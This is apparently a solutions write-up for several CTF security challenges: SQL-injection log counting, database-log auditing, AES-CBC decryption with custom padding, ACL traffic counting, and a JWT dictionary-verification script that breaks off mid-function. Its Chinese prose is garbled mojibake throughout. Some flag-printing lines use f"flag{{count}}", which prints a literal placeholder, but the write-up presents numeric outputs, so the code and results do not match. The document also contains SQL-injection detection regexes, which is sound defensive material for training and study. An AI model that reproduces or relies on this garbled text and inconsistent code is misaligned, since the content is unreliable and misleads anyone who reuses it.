åŸç†ï¼šé€šè¿‡åˆ†å·æ‰§è¡Œå¤šä¸ªSQLè¯­å¥
åˆ¤å®šé€»è¾‘
æ»¡è¶³ä»¥ä¸Šä»»ä¸€æ¨¡å¼å³åˆ¤å®šä¸ºSQLæ³¨å…¥æ”»å‡»ã€‚

ä»»åŠ¡ï¼šç»Ÿè®¡ logs.txt ä¸­ç–‘ä¼¼ SQL æ³¨å…¥çš„è¡Œæ•°ï¼Œflagæ ¼å¼ï¼šflag{è¡Œæ•°}ã€‚
```

ç›´æ¥ä½¿ç”¨è„šæœ¬  
```python
import re

def count_sql_injection_attempts(file_path):
    injection_patterns = [
        re.compile(r"'.*OR.*'='.*", re.IGNORECASE),
        re.compile(r"'.*UNION.*SELECT.*", re.IGNORECASE),
        re.compile(r"'.*;.*--", re.IGNORECASE),
        re.compile(r".*DROP\s+TABLE.*", re.IGNORECASE),
        re.compile(r".*UPDATE.*SET.*role.*=.*admin.*", re.IGNORECASE),
        re.compile(r"'.*\s+OR\s+\d+=\d+", re.IGNORECASE)
    ]

    general_patterns = [
        re.compile(r"'.*(OR|AND)\s+'?1'?'?\s*=\s*'?'?1'?", re.IGNORECASE),
        re.compile(r"'\s*UNION\s+SELECT", re.IGNORECASE),
        re.compile(r"';\s*(DROP|UPDATE|INSERT)\s+", re.IGNORECASE)
    ]

    all_patterns = injection_patterns + general_patterns

    injection_count = 0
    with open(file_path, 'r') as f:
        lines = f.readlines()
        for line in lines:
            for sub_line in line.strip().split('\n'):
                if any(pattern.search(sub_line) for pattern in all_patterns):
                    injection_count += 1
                    break
    return injection_count

file_name = 'logs.txt'
try:
    count = count_sql_injection_attempts(file_name)
    print(f"flag{{count}}")
except FileNotFoundError:
    print(f"Error: The file '{file_name}' was not found.")
```

`flag{451}`

### DB_Log
```text
é¢˜ç›®æè¿°
æœ¬é¢˜ç›®æ¨¡æ‹Ÿä¼ä¸šæ•°æ®åº“å®‰å…¨å®¡è®¡åœºæ™¯ï¼Œéœ€è¦åˆ†ææ•°æ®åº“æ“ä½œæ—¥å¿—ï¼Œæ£€æµ‹è¿åä¼ä¸šå®‰å…¨æ”¿ç­–çš„å¼‚å¸¸è¡Œä¸ºã€‚ç³»ç»ŸåŒ…å«4ä¸ªéƒ¨é—¨ï¼ˆHRã€Financeã€ITã€Salesï¼‰çš„æƒé™ç®¡ç†ï¼Œæ¯ä¸ªéƒ¨é—¨åªèƒ½è®¿é—®ç‰¹å®šçš„æ•°æ®è¡¨ã€‚

ä¼ä¸šæƒé™æ¶æ„
éƒ¨é—¨æ•°æ®è¡¨åˆ†å¸ƒï¼š

HRéƒ¨é—¨ï¼šemployee_infoã€salary_dataã€personal_info
Financeéƒ¨é—¨ï¼šfinancial_reportsã€budget_dataã€payment_records
ITéƒ¨é—¨ï¼šsystem_logsã€server_dataã€network_config
Saleséƒ¨é—¨ï¼šcustomer_dataã€sales_recordsã€product_info
æ•æ„Ÿå­—æ®µï¼šsalaryã€ssnã€phoneã€emailã€address

æ£€æµ‹è§„åˆ™
è§„åˆ™1ï¼šè·¨éƒ¨é—¨æ•°æ®è®¿é—®è¿è§„
æ£€æµ‹ç”¨æˆ·è®¿é—®éæœ¬éƒ¨é—¨çš„æ•°æ®è¡¨

è§„åˆ™2ï¼šæ•æ„Ÿå­—æ®µè®¿é—®è¿è§„
æ£€æµ‹ç”¨æˆ·è®¿é—®ä¸ªäººéšç§ä¿¡æ¯å­—æ®µ

è§„åˆ™3ï¼šå·¥ä½œæ—¶é—´å¤–æ“ä½œå¼‚å¸¸
æ£€æµ‹åœ¨éå·¥ä½œæ—¶é—´ï¼ˆå‡Œæ™¨0-5ç‚¹ï¼‰è¿›è¡Œçš„æ•°æ®åº“æ“ä½œ

è§„åˆ™4ï¼šæ•°æ®å¤‡ä»½å¼‚å¸¸æ“ä½œ
æ£€æµ‹éæˆæƒç”¨æˆ·æ‰§è¡Œæ•°æ®å¤‡ä»½æ“ä½œï¼ˆåªæœ‰ç®¡ç†å‘˜å¯ä»¥æ‰§è¡ŒBACKUPï¼‰

ä»»åŠ¡è¦æ±‚
åˆ†ææä¾›çš„æ•°æ®åº“æ“ä½œæ—¥å¿—ï¼ŒæŒ‰ç…§ä¸Šè¿°4ä¸ªæ£€æµ‹è§„åˆ™è¯†åˆ«è¿è§„è¡Œä¸ºï¼Œè¾“å‡ºè¿è§„è®°å½•çš„ç¼–å·-æ—¥å¿—IDæ ¼å¼ï¼Œå¹¶è®¡ç®—MD5å€¼ã€‚

è¾“å‡ºæ ¼å¼ï¼š

è¿è§„è®°å½•: è§„åˆ™ç¼–å·-æ—¥å¿—ID,è§„åˆ™ç¼–å·-æ—¥å¿—ID,...
æ’åˆ—é¡ºåºæŒ‰ç…§æ—¥å¿—IDé¡ºåº
flagæ ¼å¼ï¼šflag{MD5(è§„åˆ™ç¼–å·-æ—¥å¿—ID,è§„åˆ™ç¼–å·-æ—¥å¿—ID,...)}


ç¤ºä¾‹ï¼š
è¿è§„è®°å½•: 3-884,4-1036,2-1120,2-1214,1-1437,2-1553,3-1580,3-1794
flag{md5(3-884,4-1036,2-1120,2-1214,1-1437,2-1553,3-1580,3-1794)}
flag{0270383124549df3bdf631ff83e7ccb5}
```

è„šæœ¬  
```python
import re
import hashlib
from datetime import datetime, time

# --- é…ç½®å’Œå¸¸é‡ ---

# è§„åˆ™2ï¼šæ ¹æ®é¢˜ç›®è¦æ±‚å®šä¹‰çš„æ•æ„Ÿå­—æ®µé›†åˆ
SENSITIVE_FIELDS = {'salary', 'ssn', 'phone', 'email', 'address'}

# --- æ ¸å¿ƒåŠŸèƒ½å‡½æ•° ---

def load_user_permissions(perm_content: str) -> dict:
    """
    ä»æ–‡æœ¬å†…å®¹ä¸­åŠ è½½å¹¶è§£æç”¨æˆ·æƒé™ã€‚
    
    Args:
        perm_content: åŒ…å«ç”¨æˆ·æƒé™ä¿¡æ¯çš„æ–‡æœ¬ã€‚

    Returns:
        ä¸€ä¸ªä»¥ç”¨æˆ·åä¸ºé”®çš„å­—å…¸ï¼Œå€¼ä¸ºè¯¥ç”¨æˆ·çš„è¯¦ç»†æƒé™ä¿¡æ¯ï¼Œ
        åŒ…æ‹¬å…¶ä¸ªäººå…è®¸è®¿é—®çš„æ•°æ®è¡¨å’Œè§’è‰²ã€‚
    """
    users = {}
    for line in perm_content.strip().split('\n'):
        if not line.strip():
            continue
        parts = [p.strip() for p in line.strip().split(',')]
        if len(parts) < 6:
            continue
        
        # æå–å…³é”®ä¿¡æ¯
        username, tables_str, role = parts[1], parts[3], parts[5]
        
        # å°†ç”¨æˆ·çš„ä¸ªäººæƒé™è¡¨å­˜å‚¨ä¸ºé›†åˆï¼Œä¾¿äºå¿«é€ŸæŸ¥æ‰¾
        allowed_tables = set(t.strip() for t in tables_str.split(';'))
        
        users[username] = {
            'tables': allowed_tables,
            'role': role.lower()
        }
    return users

def clean_and_parse_logs(log_content: str) -> list:
    """
    æ¸…ç†å¹¶è§£æåŸå§‹æ—¥å¿—æ–‡æœ¬ï¼Œèƒ½æ­£ç¡®å¤„ç†è·¨è¡Œçš„æ—¥å¿—æ¡ç›®ã€‚

    Args:
        log_content: åŸå§‹çš„ã€å¯èƒ½åŒ…å«è·¨è¡Œè®°å½•çš„æ—¥å¿—æ–‡æœ¬ã€‚

    Returns:
        ä¸€ä¸ªåŒ…å«ç»“æ„åŒ–æ—¥å¿—ä¿¡æ¯çš„åˆ—è¡¨ã€‚
    """
    # åŸå§‹æ—¥å¿—å†…å®¹æœ¬èº«ä¸åŒ…å« æ ‡ç­¾ï¼Œå› æ­¤ä¸éœ€è¦ç§»é™¤å®ƒä»¬
    lines = log_content.strip().split('\n')

    # åˆå¹¶è¢«é”™è¯¯åˆ†å‰²çš„è¡Œï¼ˆæ ¸å¿ƒé€»è¾‘ï¼šå¦‚æœè¡Œé¦–ä¸æ˜¯æ•°å­—IDï¼Œåˆ™æ‹¼æ¥åˆ°ä¸Šä¸€è¡Œï¼‰
    cleaned_lines = []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if cleaned_lines and not re.match(r'^\d+\s', line):
            cleaned_lines[-1] = f"{cleaned_lines[-1]} {line}"
        else:
            cleaned_lines.append(line)

    parsed_logs = []
    for line in cleaned_lines:
        match = re.match(r'(\d+)\s+([\d-]+)\s+([\d:]+)\s+(\w+)\s+(.*)', line)
        if not match:
            continue

        log_id, date, time_str, username, rest_of_line = match.groups()
        
        # è§£ææ“ä½œã€è¡¨å’Œå­—æ®µç­‰è¯¦ç»†ä¿¡æ¯
        action = rest_of_line.split()[0] if rest_of_line else ''
        table_match = re.search(r'(?:QUERY|BACKUP)\s+([\w_]+)', rest_of_line)
        table = table_match.group(1) if table_match else None
        
        fields_accessed = set()
        field_match = re.search(r'field=([\w,]+)', rest_of_line)
        if field_match:
            fields_accessed.update(f.strip() for f in field_match.group(1).split(','))
        
        parsed_logs.append({
            'log_id': int(log_id),
            'timestamp': f"{date} {time_str}",
            'username': username,
            'action': action,
            'table': table,
            'fields_accessed': fields_accessed
        })
    return parsed_logs

def analyze_logs(log_content: str, perm_content: str) -> tuple[str, str]:
    """
    Args:
        log_content: æ•°æ®åº“æ—¥å¿—çš„åŸå§‹å†…å®¹ã€‚
        perm_content: ç”¨æˆ·æƒé™çš„åŸå§‹å†…å®¹ã€‚

    Returns:
        ä¸€ä¸ªå…ƒç»„ï¼ŒåŒ…å«æ ¼å¼åŒ–çš„è¿è§„è®°å½•å­—ç¬¦ä¸²å’Œæœ€ç»ˆçš„ flagã€‚
    """
    users = load_user_permissions(perm_content)
    logs = clean_and_parse_logs(log_content)
    
    violations = []

    for log in logs:
        # --- å…³é”®é€»è¾‘ï¼šåªåˆ†æ QUERY å’Œ BACKUP æ“ä½œ ---
        if log['action'] not in ('QUERY', 'BACKUP'):
            continue

        username = log['username']
        if username not in users:
            continue
        
        log_id = log['log_id']
        user_info = users[username]
        table = log['table']
        action = log['action']

        # --- è§„åˆ™1ï¼šæ£€æŸ¥ç”¨æˆ·æ˜¯å¦è®¿é—®äº†å…¶ä¸ªäººæƒé™åˆ—è¡¨ä¹‹å¤–çš„è¡¨ ---
        if table and table not in user_info['tables']:
            violations.append((log_id, f"1-{log_id}"))

        # --- è§„åˆ™2ï¼šæ£€æŸ¥æ˜¯å¦è®¿é—®äº†æ•æ„Ÿå­—æ®µ ---
        if SENSITIVE_FIELDS.intersection(log['fields_accessed']):
            violations.append((log_id, f"2-{log_id}"))

        # --- è§„åˆ™3ï¼šæ£€æŸ¥æ˜¯å¦åœ¨éå·¥ä½œæ—¶é—´ (00:00 - 04:59) æ“ä½œ ---
        try:
            dt = datetime.strptime(log['timestamp'], '%Y-%m-%d %H:%M:%S')
            if time(0, 0) <= dt.time() < time(5, 0):
                violations.append((log_id, f"3-{log_id}"))
        except ValueError:
            # å¦‚æœæ—¶é—´æˆ³æ ¼å¼é”™è¯¯ï¼Œåˆ™è·³è¿‡
            continue

        # --- è§„åˆ™4ï¼šæ£€æŸ¥éç®¡ç†å‘˜æ˜¯å¦æ‰§è¡Œå¤‡ä»½æ“ä½œ ---
        if action == 'BACKUP' and user_info['role'] != 'admin':
            violations.append((log_id, f"4-{log_id}"))

    # --- ç»“æœå¤„ç†ä¸è¾“å‡º ---
    # å»é‡å¹¶æ ¹æ®æ—¥å¿—IDæ’åº
    unique_violations = sorted(list(set(violations)), key=lambda x: x[0])
    
    # æ ¼å¼åŒ–ä¸ºæœ€ç»ˆå­—ç¬¦ä¸²
    violation_str = ",".join(v[1] for v in unique_violations)
    
    # è®¡ç®—MD5å¹¶ç”Ÿæˆflag
    flag_md5 = hashlib.md5(violation_str.encode('utf-8')).hexdigest()
    final_flag = f"flag{{flag_md5}}"

    return violation_str, final_flag


# --- ä¸»ç¨‹åºå…¥å£ ---
if __name__ == '__main__':
    try:
        with open('user_permissions.txt', 'r', encoding='utf-8') as f:
            perm_file_content = f.read()
        with open('database_logs.txt', 'r', encoding='utf-8') as f:
            log_file_content = f.read()

        violations_string, result_flag = analyze_logs(log_file_content, perm_file_content)

        print("è¿è§„è®°å½•:", violations_string)
        print(result_flag)

    except FileNotFoundError as e:
        print(f"é”™è¯¯: æ‰¾ä¸åˆ°æ–‡ä»¶ {e.filename}ã€‚è¯·ç¡®ä¿è„šæœ¬ä¸æ•°æ®æ–‡ä»¶åœ¨åŒä¸€ç›®å½•ä¸‹ã€‚")
```

`flag{1ff4054d20e07b42411bded1d6d895cf}`

### AES_Custom_Padding

```text
èƒŒæ™¯ï¼šæŸç³»ç»Ÿå¯¹å¤‡ä»½æ•°æ®ä½¿ç”¨ AES-128-CBC åŠ å¯†ï¼Œä½†é‡‡ç”¨äº†è‡ªå®šä¹‰å¡«å……ï¼š

åœ¨æ˜æ–‡æœ«å°¾æ·»åŠ ä¸€ä¸ªå­—èŠ‚ 0x80ï¼›
ä¹‹åä½¿ç”¨ 0x00 è¿›è¡Œå¡«å……ç›´åˆ°è¾¾åˆ° 16 å­—èŠ‚å—é•¿ã€‚ ï¼ˆæ³¨æ„ï¼šå¦‚æœæ˜æ–‡æ°å¥½æ˜¯å—é•¿æ•´æ•°å€ï¼ŒåŒæ ·éœ€è¦è¿½åŠ ä¸€ä¸ªå®Œæ•´å¡«å……å— 0x80 + 0x00*15ï¼‰
å·²çŸ¥ï¼š

Keyï¼ˆhexï¼‰ï¼š0123456789ABCDEF0123456789ABCDEF
IV ï¼ˆhexï¼‰ï¼š000102030405060708090A0B0C0D0E0F
åŠ å¯†æ–‡ä»¶ï¼šcipher.binï¼ˆBase64 ç¼–ç çš„å¯†æ–‡ï¼‰
ä»»åŠ¡ï¼šç¼–å†™è§£å¯†ç¨‹åºï¼Œä½¿ç”¨ç»™å®š Key/IV è¿›è¡Œ AES-128-CBC è§£å¯†ï¼Œå¹¶æŒ‰ä¸Šè¿°è‡ªå®šä¹‰å¡«å……å»é™¤å¡«å……ï¼Œå¾—åˆ°æ˜æ–‡ã€‚
```
çœ‹ä¸€ä¸‹æ•°æ®  
![](assets/img/attachments/QQ_1754449161450.png)

è§£å¯†  
```python
import base64
from Crypto.Cipher import AES

def unpad_custom(padded_data: bytes) -> bytes:
    """
    æ ¹æ®è‡ªå®šä¹‰è§„åˆ™å»é™¤å¡«å……ï¼š
    1. å¯»æ‰¾æœ€åä¸€ä¸ª 0x80 å­—èŠ‚ã€‚
    2. ç§»é™¤ä»è¯¥å­—èŠ‚å¼€å§‹çš„æ‰€æœ‰å†…å®¹ã€‚
    
    Args:
        padded_data: è§£å¯†åä½†ä»åŒ…å«å¡«å……çš„æ•°æ®ã€‚

    Returns:
        å»é™¤å¡«å……åçš„åŸå§‹æ˜æ–‡ã€‚
    """
    # ä»åå‘å‰æŸ¥æ‰¾ 0x80 å­—èŠ‚çš„ä½ç½®
    last_80_index = padded_data.rfind(b'\x80')
    
    # å¦‚æœæ²¡æœ‰æ‰¾åˆ° 0x80ï¼Œè¯´æ˜æ•°æ®æ ¼å¼å¯èƒ½æœ‰è¯¯ï¼Œè¿”å›åŸå§‹æ•°æ®
    if last_80_index == -1:
        print("è­¦å‘Šï¼šåœ¨è§£å¯†æ•°æ®ä¸­æœªæ‰¾åˆ°å¡«å……æ ‡è®° 0x80ã€‚")
        return padded_data
        
    # éªŒè¯ 0x80 ä¹‹åæ˜¯å¦éƒ½æ˜¯ 0x00ï¼Œè¿™æ˜¯å¯é€‰çš„ï¼Œä½†å¯ä»¥å¢åŠ å¥å£®æ€§
    for byte in padded_data[last_80_index + 1:]:
        if byte != 0x00:
            print("è­¦å‘Šï¼šå¡«å……æ ¼å¼ä¸æ­£ç¡®ï¼Œ0x80 ä¹‹ååŒ…å«é 0x00 å­—èŠ‚ã€‚")
            break # å³ä½¿æ ¼å¼ä¸æ­£ç¡®ï¼Œä»ç„¶æŒ‰è§„åˆ™æˆªæ–­

    # è¿”å› 0x80 ä¹‹å‰çš„æ•°æ®
    return padded_data[:last_80_index]

def decrypt_aes_cbc_custom_padding(key_hex: str, iv_hex: str, ciphertext_b64: str) -> str:
    """
    ä½¿ç”¨ç»™å®šçš„ Key å’Œ IV å¯¹å¯†æ–‡è¿›è¡Œ AES-128-CBC è§£å¯†ï¼Œå¹¶å¤„ç†è‡ªå®šä¹‰å¡«å……ã€‚

    Args:
        key_hex: 16è¿›åˆ¶è¡¨ç¤ºçš„å¯†é’¥ã€‚
        iv_hex: 16è¿›åˆ¶è¡¨ç¤ºçš„åˆå§‹åŒ–å‘é‡ã€‚
        ciphertext_b64: Base64 ç¼–ç çš„å¯†æ–‡ã€‚

    Returns:
        è§£å¯†å¹¶å»é™¤å¡«å……åçš„æ˜æ–‡å­—ç¬¦ä¸²ã€‚
    """
    try:
        # 1. å°†åå…­è¿›åˆ¶çš„ Key å’Œ IV ä»¥åŠ Base64 çš„å¯†æ–‡è½¬æ¢ä¸ºå­—èŠ‚
        key = bytes.fromhex(key_hex)
        iv = bytes.fromhex(iv_hex)
        ciphertext = base64.b64decode(ciphertext_b64)

        # 2. åˆ›å»º AES-CBC è§£å¯†å™¨
        cipher = AES.new(key, AES.MODE_CBC, iv)

        # 3. è§£å¯†æ•°æ®
        decrypted_padded = cipher.decrypt(ciphertext)

        # 4. å»é™¤è‡ªå®šä¹‰å¡«å……
        plaintext_bytes = unpad_custom(decrypted_padded)

        # 5. å°†ç»“æœè§£ç ä¸º UTF-8 å­—ç¬¦ä¸²
        return plaintext_bytes.decode('utf-8')

    except (ValueError, KeyError) as e:
        return f"è§£å¯†è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: {e}"
    except UnicodeDecodeError:
        return "è§£å¯†æˆåŠŸï¼Œä½†æ— æ³•å°†ç»“æœè§£ç ä¸º UTF-8 å­—ç¬¦ä¸²ã€‚è¯·æ£€æŸ¥åŸå§‹ç¼–ç ã€‚"


# --- ä¸»ç¨‹åº ---
if __name__ == "__main__":
    # å·²çŸ¥ä¿¡æ¯
    KEY_HEX = "0123456789ABCDEF0123456789ABCDEF"
    IV_HEX = "000102030405060708090A0B0C0D0E0F"
    # ä» cipher.bin æ–‡ä»¶ä¸­è¯»å–çš„ Base64 å¯†æ–‡
    CIPHERTEXT_B64 = "WU+8dpscYYw+q52uQqX8OPiesnTajq++AXj05zX3u9an27JZR9/31yZaWdtPM5df"

    print("å¼€å§‹è§£å¯†...")
    print(f"å¯†é’¥ (HEX): {KEY_HEX}")
    print(f"IV (HEX):   {IV_HEX}")
    print(f"å¯†æ–‡ (B64): {CIPHERTEXT_B64}")
    print("-" * 30)

    # æ‰§è¡Œè§£å¯†
    plaintext = decrypt_aes_cbc_custom_padding(KEY_HEX, IV_HEX, CIPHERTEXT_B64)

    print(f"è§£å¯†å®Œæˆï¼")
    print(f"æ˜æ–‡å†…å®¹: {plaintext}")


```

`flag{T1s_4ll_4b0ut_AES_custom_padding!}`

###ACL_Allow_Count  
```text
ACL è§„åˆ™åŒ¹é…ä¸å…è®¸æ¡æ•°ç»Ÿè®¡

è¯´æ˜ï¼šç»™å®š 3 æ¡ ACL è§„åˆ™ä¸ 2000 æ¡æµé‡æ—¥å¿—ï¼ˆrules.txt, traffic.txtï¼‰ã€‚

è§„åˆ™æ ¼å¼ï¼š<action> <proto> <src> <dst> <dport>
action: allow/deny
proto: tcp/udp/any
src/dst: IPv4 æˆ– CIDR æˆ– any
dport: ç«¯å£å·æˆ– any
æµé‡æ ¼å¼ï¼š<proto> <src> <dst> <dport>
åŒ¹é…åŸåˆ™ï¼šè‡ªä¸Šè€Œä¸‹ first-matchï¼›è‹¥æ— åŒ¹é…åˆ™é»˜è®¤ denyã€‚

ä»»åŠ¡ï¼šç»Ÿè®¡è¢«å…è®¸ï¼ˆallowï¼‰çš„æµé‡æ¡æ•°å¹¶è¾“å‡ºè¯¥æ•°å­—ï¼Œflagæ ¼å¼ï¼šflag{allowæµé‡æ¡æ•°}
```

è„šæœ¬  
```python
import sys
import ipaddress

def parse_rule(rule_line: str) -> dict | None:
    """
    å°†å•æ¡ ACL è§„åˆ™è¡Œè§£æä¸ºå­—å…¸ã€‚
    ä¾‹å¦‚ï¼š'deny tcp any any 23' -> {'action': 'deny', 'proto': 'tcp', 'src': 'any', 'dst': 'any', 'dport': '23'}
    """
    parts = rule_line.strip().split()
    if len(parts) != 5:
        return None
    return {
        'action': parts[0],
        'proto': parts[1],
        'src': parts[2],
        'dst': parts[3],
        'dport': parts[4]
    }

def parse_traffic(traffic_line: str) -> dict | None:
    """
    å°†å•æ¡æµé‡æ—¥å¿—è¡Œè§£æä¸ºå­—å…¸ã€‚
    ä¾‹å¦‚ï¼š'tcp 39.128.113.192 7.244.88.218 53' -> {'proto': 'tcp', ...}
    """
    parts = traffic_line.strip().split()
    if len(parts) != 4:
        return None
    return {
        'proto': parts[0],
        'src': parts[1],
        'dst': parts[2],
        'dport': parts[3]
    }

def ip_in_network(ip_str: str, network_str: str) -> bool:
    """
    æ£€æŸ¥ä¸€ä¸ª IP åœ°å€æ˜¯å¦å±äºä¸€ä¸ªç½‘ç»œï¼ˆCIDR æ ¼å¼ï¼‰ã€‚
    å¦‚æœè§„åˆ™ä¸­çš„åœ°å€ä¸æ˜¯'any'ï¼Œåˆ™è°ƒç”¨æ­¤å‡½æ•°ã€‚
    """
    try:
        ip = ipaddress.ip_address(ip_str)
        network = ipaddress.ip_network(network_str)
        return ip in network
    except ValueError:
        # å¦‚æœ network_str ä¸æ˜¯æœ‰æ•ˆçš„ IP æˆ– CIDR åœ°å€ï¼Œåˆ™è®¤ä¸ºä¸åŒ¹é…
        return False

def traffic_matches_rule(traffic: dict, rule: dict) -> bool:
    """
    æ ¸å¿ƒå‡½æ•°ï¼šæ£€æŸ¥ç»™å®šçš„æµé‡æ˜¯å¦åŒ¹é…æŸæ¡è§„åˆ™ã€‚
    """
    # 1. åè®®åŒ¹é…
    if rule['proto'] != 'any' and rule['proto'] != traffic['proto']:
        return False

    # 2. ç›®æ ‡ç«¯å£åŒ¹é…
    if rule['dport'] != 'any' and rule['dport'] != traffic['dport']:
        return False

    # 3. æº IP åŒ¹é… (æ”¯æŒ 'any' å’Œ CIDR)
    if rule['src'] != 'any' and not ip_in_network(traffic['src'], rule['src']):
        return False

    # 4. ç›®æ ‡ IP åŒ¹é… (æ”¯æŒ 'any' å’Œ CIDR)
    if rule['dst'] != 'any' and not ip_in_network(traffic['dst'], rule['dst']):
        return False

    # å¦‚æœæ‰€æœ‰æ¡ä»¶éƒ½é€šè¿‡ï¼Œåˆ™æµé‡ä¸è§„åˆ™åŒ¹é…
    return True

def main(rules_path: str, traffic_path: str):
    """
    ä¸»å‡½æ•°ï¼Œæ‰§è¡Œæ‰€æœ‰é€»è¾‘ã€‚
    """
    try:
        with open(rules_path, 'r', encoding='utf-8') as f:
            # è¯»å–å¹¶è§£ææ‰€æœ‰è§„åˆ™ï¼Œè¿‡æ»¤æ‰ç©ºè¡Œæˆ–æ ¼å¼é”™è¯¯çš„è¡Œ
            rules = [parse_rule(line) for line in f if line.strip()]
            rules = [r for r in rules if r]
    except FileNotFoundError:
        print(f"é”™è¯¯: è§„åˆ™æ–‡ä»¶æœªæ‰¾åˆ° '{rules_path}'")
        sys.exit(1)

    try:
        with open(traffic_path, 'r', encoding='utf-8') as f:
            # è¯»å–å¹¶è§£ææ‰€æœ‰æµé‡æ—¥å¿—ï¼Œè¿‡æ»¤æ‰ç©ºè¡Œæˆ–æ ¼å¼é”™è¯¯çš„è¡Œ
            traffic_logs = [parse_traffic(line) for line in f if line.strip()]
            traffic_logs = [t for t in traffic_logs if t]
    except FileNotFoundError:
        print(f"é”™è¯¯: æµé‡æ—¥å¿—æ–‡ä»¶æœªæ‰¾åˆ° '{traffic_path}'")
        sys.exit(1)

    allowed_count = 0

    # éå†æ¯ä¸€æ¡æµé‡æ—¥å¿—
    for traffic in traffic_logs:
        # æ ¹æ®é¢˜ç›®è¦æ±‚ï¼Œè‹¥æ— åŒ¹é…ï¼Œåˆ™é»˜è®¤ deny
        final_action = 'deny'
        
        # æŒ‰ç…§è§„åˆ™é¡ºåºè¿›è¡ŒåŒ¹é…ï¼ˆFirst-Matchï¼‰
        for rule in rules:
            if traffic_matches_rule(traffic, rule):
                final_action = rule['action']
                break  # æ‰¾åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…çš„è§„åˆ™åï¼Œåœæ­¢ç»§ç»­åŒ¹é…

        # å¦‚æœæœ€ç»ˆåŠ¨ä½œä¸º 'allow'ï¼Œåˆ™è®¡æ•°å™¨åŠ ä¸€
        if final_action == 'allow':
            allowed_count += 1
            
    # --- è¾“å‡ºç»“æœ ---
    print(f"å·²å¤„ç†æµé‡æ€»æ•°: {len(traffic_logs)}")
    print(f"è¢«æ‹’ç»çš„æµé‡æ¡æ•°: {len(traffic_logs) - allowed_count}")
    print(f"è¢«å…è®¸çš„æµé‡æ¡æ•°: {allowed_count}")
    print("-" * 25)
    # æŒ‰è¦æ±‚æ ¼å¼è¾“å‡º flag
    print(f"flag{{allowed_count}}")


if __name__ == "__main__":
    # å°†ä½ çš„è§„åˆ™æ–‡ä»¶åå’Œæµé‡æ–‡ä»¶ååœ¨è¿™é‡ŒæŒ‡å®š
    rules_file = "rules.txt"
    traffic_file = "traffic.txt"
    
    print(f"æ­£åœ¨ä½¿ç”¨è§„åˆ™æ–‡ä»¶: '{rules_file}'")
    print(f"æ­£åœ¨åˆ†ææµé‡æ–‡ä»¶: '{traffic_file}'\n")

    main(rules_file, traffic_file)
```

```text
æ­£åœ¨ä½¿ç”¨è§„åˆ™æ–‡ä»¶: 'rules.txt'
æ­£åœ¨åˆ†ææµé‡æ–‡ä»¶: 'traffic.txt'

å·²å¤„ç†æµé‡æ€»æ•°: 2000
è¢«æ‹’ç»çš„æµé‡æ¡æ•°: 271
è¢«å…è®¸çš„æµé‡æ¡æ•°: 1729
-------------------------
flag{1729}
```

### JWT_Weak_Secret
```text
é¢˜ç›®æè¿°
æœ¬é¢˜ç›®æ¨¡æ‹ŸçœŸå®åœºæ™¯ä¸­çš„JWTï¼ˆJSON Web Tokenï¼‰å®‰å…¨å®¡è®¡ä»»åŠ¡ï¼Œéœ€è¦æ£€æµ‹ä½¿ç”¨å¼±å¯†é’¥ç­¾åçš„JWTä»¤ç‰Œï¼Œå¹¶è¯†åˆ«å…·æœ‰ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·ã€‚

ä»»åŠ¡è¦æ±‚
1ã€ç­¾åéªŒè¯ï¼š
å¯¹äºHS256ç®—æ³•çš„JWTï¼šä½¿ç”¨å­—å…¸ä¸­çš„å¯†ç é€ä¸€å°è¯•éªŒè¯ç­¾å
å¯¹äºRS256ç®—æ³•çš„JWTï¼šä½¿ç”¨æä¾›çš„å…¬é’¥éªŒè¯ç­¾å

2ã€æƒé™æ£€æŸ¥ï¼š
æ£€æŸ¥JWTè½½è·ä¸­çš„ç®¡ç†å‘˜æƒé™æ ‡è¯†
ç®¡ç†å‘˜æƒé™æ¡ä»¶ï¼šadmin=true æˆ– role âˆˆ {admin, superuser}

3ã€ç»Ÿè®¡ç»“æœï¼š
ç»Ÿè®¡åŒæ—¶æ»¡è¶³ä»¥ä¸‹æ¡ä»¶çš„JWTä»¤ç‰Œæ•°é‡ï¼š
ç­¾åéªŒè¯é€šè¿‡
å…·æœ‰ç®¡ç†å‘˜æƒé™
flagæ ¼å¼ï¼šflag{a:b:c...},a,b,cæ˜¯ä»¤ç‰Œåºå·ï¼Œä»å°åˆ°å¤§çš„é¡ºåºã€‚

JWTè½½è·ç»“æ„ç¤ºä¾‹
{
  "iat": 1721995200,           // ç­¾å‘æ—¶é—´
  "exp": 1722038400,           // è¿‡æœŸæ—¶é—´
  "sub": "alice",              // ç”¨æˆ·æ ‡è¯†
  "iss": "svc-auth",           // ç­¾å‘è€…
  "admin": true,               // ç®¡ç†å‘˜æ ‡è¯†ï¼ˆæ–¹å¼1ï¼‰
  "role": "admin"              // è§’è‰²æ ‡è¯†ï¼ˆæ–¹å¼2ï¼‰
}
```

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import json
import hmac
import hashlib
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import load_pem_public_key

def base64url_decode(data: str) -> bytes:
    """å¯¹Base64URLå­—ç¬¦ä¸²è¿›è¡Œè§£ç ï¼Œå¹¶å¤„ç†ç¼ºå¤±çš„å¡«å……ã€‚"""
    missing_padding = len(data) % 4
    if missing_padding:
        data += '=' * (4 - missing_padding)
    return base64.urlsafe_b64decode(data)

def verify_hs256_signature(header_payload: str, signature: str, secret: str) -> bool:
    """ä½¿ç”¨ç»™å®šçš„å¯†é’¥éªŒè¯HS256ç­¾åã€‚"""
    try:
        expected_signature = hmac.new(
            secret.encode('utf-8'),
            header_payload.encode('utf-8'),
            hashlib.sha256
        ).digest()
        
        decoded_signature = base64url_decode(signature)
        
        return hmac.compare_digest(expected_signature, decoded_signature)
    except Exception:
        return False

def verify_rs256_signature(header_payload: str, signature: str, public_key_pem: str) -> bool:
    """ä½¿ç”¨ç»™å®šçš„å…¬é’¥éªŒè¯RS256ç­¾åã€‚"""
    try:
        public_key = load_pem_public_key(public_key_pem.encode('utf-8'))
        signature_bytes = base64url_decode(signature)
        
        public_key.verify(
            signature_bytes,
            header_payload.encode('utf-8'),
            padding.PKCS1v15(),
            hashes.SHA256()
        )
        return True
    except Exception:
        return False

def has_admin_privileges(payload: dict) -> bool:
    """æ£€æŸ¥JWTè½½è·æ˜¯å¦åŒ…å«ç®¡ç†å‘˜æƒé™ã€‚"""
    if payload.get('admin') is True:
        return True
    if payload.get('role') in ['admin', 'superuser']:
        return True
    return False

def main():
